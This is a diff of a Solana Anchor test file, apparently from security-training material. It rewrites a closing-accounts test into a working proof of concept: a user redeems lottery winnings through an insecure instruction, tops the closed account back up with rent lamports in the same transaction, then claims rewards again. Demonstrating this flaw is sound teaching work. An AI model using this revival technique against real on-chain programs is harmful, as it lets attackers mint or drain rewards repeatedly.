@@ -2,8 +2,10 @@ import * as anchor from "@project-serum/anchor"
 import { Program } from "@project-serum/anchor"
 import { ClosingAccounts } from "../target/types/closing_accounts"
 import { PublicKey, Keypair, SystemProgram, Transaction } from '@solana/web3.js'
+import { getOrCreateAssociatedTokenAccount, createMint, TOKEN_PROGRAM_ID } from "@solana/spl-token"
 import { safeAirdrop } from "./utils/utils"
 import { expect } from 'chai'
+import { associated } from "@project-serum/anchor/dist/cjs/utils/pubkey"
 
 describe("closing-accounts", () => {
   // Configure the client to use the local cluster.
@@ -11,89 +13,101 @@ describe("closing-accounts", () => {
   const provider = anchor.AnchorProvider.env()
   const program = anchor.workspace.ClosingAccounts as Program<ClosingAccounts>
   const authority = Keypair.generate()
+  let userAta: PublicKey = null
+  let rewardMint: PublicKey = null
+  let mintAuth: PublicKey = null
 
-  it("Initialize and Close Data Account", async () => {
+
+  it("Enter lottery", async () => {
     // Add your test here.
-    const [dataAccount, bump] = await PublicKey.findProgramAddressSync(
+    const [lotteryEntry, bump] = await PublicKey.findProgramAddressSync(
       [Buffer.from("test-seed"), authority.publicKey.toBuffer()],
       program.programId
     )
+    const [mint, mintBump] = await PublicKey.findProgramAddressSync(
+      [Buffer.from("mint-seed")],
+      program.programId
+    )
+    mintAuth = mint
+
     await safeAirdrop(authority.publicKey, provider.connection)
 
-    // tx to initialize the data account
-    await program.methods.initialize()
+    rewardMint = await createMint(
+      provider.connection,
+      authority,
+      mintAuth,
+      null,
+      6
+    )
+
+    const associatedAcct = await getOrCreateAssociatedTokenAccount(
+      provider.connection,
+      authority,
+      rewardMint,
+      authority.publicKey
+    )
+    userAta = associatedAcct.address
+
+
+    // tx to enter lottery
+    await program.methods.enterLottery()
     .accounts({
-      dataAccount: dataAccount,
-      authority: authority.publicKey,
+      lotteryEntry: lotteryEntry,
+      user: authority.publicKey,
+      userAta: userAta,
       systemProgram: SystemProgram.programId
     })
     .signers([authority])
     .rpc()
+  })
+
+  it("close + refund lottery acct to continuously claim rewards", async () => {
+
+    const [lotteryEntry, bump] = await PublicKey.findProgramAddressSync(
+      [Buffer.from("test-seed"), authority.publicKey.toBuffer()],
+      program.programId
+    )
 
     const tx = new Transaction()
-    // instruction attempts to close the account
-    const ix1 = await program.methods.closeAcct()
-    .accounts({
-      dataAccount: dataAccount,
-      receiver: authority.publicKey
-    })
-    .instruction()
-    tx.add(ix1)
 
-    // malicious user adds instruction to refund dataAccount lamports
-    const maliciousAttacker = Keypair.generate()
-    await safeAirdrop(maliciousAttacker.publicKey, provider.connection)
-    const rentExemptLamports = await provider.connection.getMinimumBalanceForRentExemption(16, "confirmed")
+    // instruction claims rewards, program will try to close account
+    const ix1 = await program.methods.redeemWinningsInsecure()
+      .accounts({
+        lotteryEntry: lotteryEntry,
+        user: authority.publicKey,
+        userAta: userAta,
+        rewardMint: rewardMint,
+        mintAuth: mintAuth,
+        tokenProgram: TOKEN_PROGRAM_ID
+      })
+      .instruction()
+      // add ix to tx
+      tx.add(ix1)
+
+    // user adds instruction to refund dataAccount lamports
+    const rentExemptLamports = await provider.connection.getMinimumBalanceForRentExemption(82, "confirmed")
     tx.add(
       SystemProgram.transfer({
-          fromPubkey: maliciousAttacker.publicKey,
-          toPubkey: dataAccount,
+          fromPubkey: authority.publicKey,
+          toPubkey: lotteryEntry,
           lamports: rentExemptLamports,
       })
     )
-
     // tx is sent
-    const txSig = await provider.connection.sendTransaction(tx, [authority, maliciousAttacker])
+    const txSig = await provider.connection.sendTransaction(tx, [authority])
     await provider.connection.confirmTransaction(txSig)
 
-    // try to fetch account data
-    try {
-      const closedAcct = await program.account.dataAccount.fetch(dataAccount)
-      console.log("Account data:", closedAcct.data)
-    } catch (e) {
-      console.log(e.message)
-      expect(e.message).to.eq("Invalid account discriminator")
-    }
-
-    // malicious user tries to use account
-    try {
-      await program.methods.doSomething()
+    // claim rewards for a 2nd time
+    await program.methods.redeemWinningsInsecure()
       .accounts({
-        dataAccount: dataAccount,
+        lotteryEntry: lotteryEntry,
+        user: authority.publicKey,
+        userAta: userAta,
+        rewardMint: rewardMint,
+        mintAuth: mintAuth,
+        tokenProgram: TOKEN_PROGRAM_ID
       })
+      .signers([authority])
       .rpc()
-    }
-    catch (e) {
-      console.log(e.message)
-      expect(e.message).to.eq("AnchorError caused by account: data_account. Error Code: AccountDiscriminatorMismatch. Error Number: 3002. Error Message: 8 byte discriminator did not match what was expected.")
-    }
-
-    // force defund the account
-    const defundTx = await program.methods.forceDefund()
-    .accounts({
-      dataAccount: dataAccount,
-      destination: authority.publicKey
-    })
-    .rpc()
-    await provider.connection.confirmTransaction(defundTx)
-
-    // try to fetch account data, but it should be closed now
-    try {
-      const closedAcct = await program.account.dataAccount.fetch(dataAccount)
-      console.log("Account data:", closedAcct.data)
-    } catch (e) {
-      console.log(e.message)
-      expect(e.message).to.eq(`Account does not exist ${dataAccount.toBase58()}`)
-    }
   })
 })
